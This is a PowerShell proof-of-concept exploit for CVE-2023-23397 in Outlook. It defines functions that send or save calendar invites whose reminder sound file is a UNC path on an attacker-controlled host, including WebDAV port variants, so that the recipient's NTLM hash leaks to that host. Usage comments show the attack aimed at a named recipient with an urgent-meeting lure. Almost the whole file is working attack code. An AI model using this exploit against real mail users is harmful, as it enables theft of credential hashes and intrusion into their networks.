# CVE-2023-23397 POC
# Author: Stanislav Istyagin (@clevergod) - SecuriXy
# Usage examples: 
# Sending:
# Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\XX.XX.XX.XX\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local@80\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local@SSL@443\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
#
# Saving:
# Save-CalendarNTLMLeak -remotefilepath "\\XX.XX.XX.XX\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local@80\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
# Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local@SSL@443\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."


function Send-CalendarNTLMLeak ($recipient, $remotefilepath, $meetingsubject, $meeetingbody)
{
    $Outlook = New-Object -comObject Outlook.Application
    $newcal = $outlook.CreateItem('olAppointmentItem')
    $newcal.ReminderSoundFile = $remotefilepath
    $newcal.Recipients.add($recipient)
    $newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
    $newcal.Subject = $meetingsubject
    $newcal.Location = "Virtual"
    $newcal.Body = $meetingbody
    $newcal.Start = get-date
    $newcal.End = (get-date).AddHours(2)
    $newcal.ReminderOverrideDefault = 1
    $newcal.ReminderSet = 1
    $newcal.ReminderPlaysound = 1
    $newcal.send()
}

function Save-CalendarNTLMLeak ($remotefilepath, $meetingsubject, $meeetingbody)
{
    $Outlook = New-Object -comObject Outlook.Application
    $newcal = $outlook.CreateItem('olAppointmentItem')
    $newcal.ReminderSoundFile = $remotefilepath
    $newcal.MeetingStatus = [Microsoft.Office.Interop.Outlook.OlMeetingStatus]::olMeeting
    $newcal.Subject = $meetingsubject
    $newcal.Location = "Virtual"
    $newcal.Body = $meetingbody
    $newcal.Start = get-date
    $newcal.End = (get-date).AddHours(2)
    $newcal.ReminderOverrideDefault = 1
    $newcal.ReminderSet = 1
    $newcal.ReminderPlaysound = 1
    $newcal.save()
}
